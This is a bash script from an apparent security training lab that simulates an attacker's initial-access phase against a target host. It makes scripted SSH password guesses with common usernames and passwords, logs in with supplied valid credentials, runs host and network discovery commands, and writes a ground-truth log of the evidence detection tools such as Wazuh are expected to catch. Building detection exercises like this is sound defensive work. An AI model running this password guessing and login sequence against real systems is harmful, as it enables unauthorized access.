#!/bin/bash

# ============================================================
# Nordic Manufacturing A/S - Attack Simulation
# Phase 03 - Authentication / Initial Access
#
# MANUAL:
#   ./03-auth.sh
#
# AUTOMATIC:
#   NORDIC_AUTO=1
#   NORDIC_COMPROMISED_HOST=192.168.1.20
#   NORDIC_SSH_USER=student
#   NORDIC_SSH_PASSWORD=password
#   ./03-auth.sh
# ============================================================

set -u

LOG_DIR="/opt/nordic-attack/logs"
mkdir -p "$LOG_DIR"

TIMESTAMP=$(date +"%Y%m%d-%H%M%S")
INCIDENT_ID="${NORDIC_INCIDENT_ID:-MANUAL-$TIMESTAMP}"
LOG_FILE="$LOG_DIR/${INCIDENT_ID}-03-auth.log"

echo "======================================================"
echo " Nordic Manufacturing - Phase 03: Initial Access"
echo "======================================================"
echo

# ------------------------------------------------------------
# Dependency check
# ------------------------------------------------------------

if ! command -v sshpass >/dev/null 2>&1; then
    echo "[ERROR] sshpass is not installed."
    echo
    echo "Install with:"
    echo "  sudo apt update"
    echo "  sudo apt install -y sshpass"
    exit 1
fi

# ------------------------------------------------------------
# AUTO / MANUAL input
# ------------------------------------------------------------

if [[ "${NORDIC_AUTO:-0}" == "1" ]]; then

    if [[ -z "${NORDIC_COMPROMISED_HOST:-}" ]]; then
        echo "[ERROR] NORDIC_COMPROMISED_HOST is not set."
        exit 1
    fi

    if [[ -z "${NORDIC_SSH_USER:-}" ]]; then
        echo "[ERROR] NORDIC_SSH_USER is not set."
        exit 1
    fi

    if [[ -z "${NORDIC_SSH_PASSWORD:-}" ]]; then
        echo "[ERROR] NORDIC_SSH_PASSWORD is not set."
        exit 1
    fi

    TARGET="$NORDIC_COMPROMISED_HOST"
    SSH_USER="$NORDIC_SSH_USER"
    SSH_PASSWORD="$NORDIC_SSH_PASSWORD"

    echo "[AUTO MODE]"
    echo "Target : $TARGET"
    echo "User   : $SSH_USER"

else

    echo "[MANUAL MODE]"

    read -rp "SSH target IP: " TARGET
    read -rp "Valid SSH username: " SSH_USER
    read -rsp "Valid SSH password: " SSH_PASSWORD
    echo

fi

# ------------------------------------------------------------
# Validation
# ------------------------------------------------------------

if [[ -z "$TARGET" || -z "$SSH_USER" || -z "$SSH_PASSWORD" ]]; then
    echo "[ERROR] Target, username and password are required."
    exit 1
fi

echo
echo "[*] Incident ID : $INCIDENT_ID"
echo "[*] Target      : $TARGET"
echo "[*] Valid user  : $SSH_USER"
echo "[*] Log         : $LOG_FILE"
echo

{
    echo "Incident ID: $INCIDENT_ID"
    echo "Phase: AUTHENTICATION / INITIAL ACCESS"
    echo "Timestamp: $(date --iso-8601=seconds)"
    echo "Target: $TARGET"
    echo "Valid user: $SSH_USER"
    echo
} >> "$LOG_FILE"

# ------------------------------------------------------------
# Check SSH
# ------------------------------------------------------------

echo "[1/4] Checking TCP/22..."

if timeout 3 bash -c "echo >/dev/tcp/$TARGET/22" 2>/dev/null; then
    echo "[+] SSH appears reachable."
else
    echo "[ERROR] TCP/22 is not reachable on $TARGET."
    exit 1
fi

echo
sleep 2

# ------------------------------------------------------------
# Failed authentication attempts
# ------------------------------------------------------------

echo "[2/4] Generating failed SSH authentication attempts..."
echo

FAILED_USERS=(
    "administrator"
    "backup"
    "service"
    "support"
    "$SSH_USER"
)

FAILED_PASSWORDS=(
    "Password123!"
    "Welcome123"
    "Nordic2026!"
    "Summer2026!"
    "WrongPassword!"
)

for i in "${!FAILED_USERS[@]}"; do

    USER="${FAILED_USERS[$i]}"
    PASS="${FAILED_PASSWORDS[$i]}"

    echo "[>] Failed login attempt: $USER@$TARGET"

    sshpass -p "$PASS" \
        ssh \
        -o StrictHostKeyChecking=no \
        -o UserKnownHostsFile=/dev/null \
        -o ConnectTimeout=3 \
        -o PreferredAuthentications=password \
        -o PubkeyAuthentication=no \
        "$USER@$TARGET" \
        "exit" >/dev/null 2>&1 || true

    echo "[$(date --iso-8601=seconds)] FAILED SSH LOGIN user=$USER target=$TARGET" \
        >> "$LOG_FILE"

    sleep 2

done

echo
echo "[+] Failed authentication activity generated."
echo

# ------------------------------------------------------------
# Successful login
# ------------------------------------------------------------

echo "[3/4] Attempting successful authentication..."
echo

REMOTE_OUTPUT=$(sshpass -p "$SSH_PASSWORD" \
    ssh \
    -o StrictHostKeyChecking=no \
    -o UserKnownHostsFile=/dev/null \
    -o ConnectTimeout=5 \
    -o PreferredAuthentications=password \
    -o PubkeyAuthentication=no \
    "$SSH_USER@$TARGET" \
    '
        echo "=== INITIAL ACCESS ==="
        echo "USER:"
        whoami
        echo
        echo "HOSTNAME:"
        hostname
        echo
        echo "IDENTITY:"
        id
        echo
        echo "NETWORK:"
        ip -brief address 2>/dev/null || true
        echo
        echo "LOGGED IN USERS:"
        who 2>/dev/null || true
    ' 2>/dev/null)

SSH_RESULT=$?

if [[ $SSH_RESULT -ne 0 ]]; then
    echo "[ERROR] Successful login failed."
    echo
    echo "Check:"
    echo "  - Username"
    echo "  - Password"
    echo "  - SSH password authentication"
    echo "  - Firewall"
    exit 1
fi

echo "[+] Authentication successful."
echo
echo "$REMOTE_OUTPUT"

{
    echo
    echo "SUCCESSFUL LOGIN"
    echo "Timestamp: $(date --iso-8601=seconds)"
    echo "User: $SSH_USER"
    echo "Target: $TARGET"
    echo
    echo "$REMOTE_OUTPUT"
} >> "$LOG_FILE"

# ------------------------------------------------------------
# Post-login activity
# ------------------------------------------------------------

echo
echo "[4/4] Generating basic post-login activity..."

sshpass -p "$SSH_PASSWORD" \
    ssh \
    -o StrictHostKeyChecking=no \
    -o UserKnownHostsFile=/dev/null \
    "$SSH_USER@$TARGET" \
    '
        whoami >/dev/null
        hostname >/dev/null
        id >/dev/null
        ip route >/dev/null 2>&1
        ip neigh >/dev/null 2>&1
    ' >/dev/null 2>&1 || true

echo "[+] Post-login discovery activity generated."

# ------------------------------------------------------------
# Ground truth
# ------------------------------------------------------------

{
    echo
    echo "=================================================="
    echo "GROUND TRUTH"
    echo "=================================================="
    echo "Incident: $INCIDENT_ID"
    echo "Phase: AUTHENTICATION / INITIAL ACCESS"
    echo "Source: $(hostname)"
    echo "Target: $TARGET"
    echo "Compromised account: $SSH_USER"
    echo
    echo "Simulated activity:"
    echo "- Multiple failed SSH authentications"
    echo "- Failed login against valid account"
    echo "- Successful SSH authentication"
    echo "- Basic host/network discovery after login"
    echo
    echo "Expected evidence:"
    echo "- sshd/authentication logs"
    echo "- Wazuh authentication alerts"
    echo "- Source IP from AttackVM"
    echo "- Successful SSH session"
    echo "=================================================="
} >> "$LOG_FILE"

echo
echo "======================================================"
echo " Phase 03 complete - Initial Access established"
echo "======================================================"
echo
echo "Target       : $TARGET"
echo "Account      : $SSH_USER"
echo "Incident ID  : $INCIDENT_ID"
echo "Ground truth : $LOG_FILE"
echo